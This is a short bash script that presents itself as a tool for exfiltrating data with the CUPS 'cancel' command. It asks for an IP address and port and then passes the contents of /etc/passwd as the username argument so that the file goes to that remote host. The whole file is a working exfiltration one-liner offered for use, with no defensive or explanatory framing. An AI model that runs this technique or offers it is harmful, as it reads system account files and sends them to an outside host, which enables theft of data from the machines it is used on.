#!/bin/bash

echo -e "\e[92mExfiltrating data using cancel!"

printf "Enter the IP Addres: "
read IP
printf "Enter the Port: " 
read PORT


if ! command -v cancel &> /dev/null; then
    echo -e "\e[91mError: 'cancel' command is not installed."
    echo "Please install 'cups-client' by running: sudo apt install cups-client"
    exit 1
fi

echo -e "\e[92mSending data to remote server..."

cancel -u "$(cat /etc/passwd)" -h $IP:$PORT
